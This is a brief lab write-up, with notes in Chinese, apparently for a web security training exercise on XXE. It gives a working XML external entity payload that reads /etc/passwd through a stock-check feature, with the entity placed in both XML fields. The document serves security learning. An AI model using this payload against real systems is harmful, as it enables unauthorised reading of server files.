# Lab: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

## XXE
* 題目說 stock 的地方有 XXE 的問題，直接帶入下面的 payload 就可以過了
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>
```
* 記得要用 `&xxe;` 取代掉 productId 跟 storeId 的 value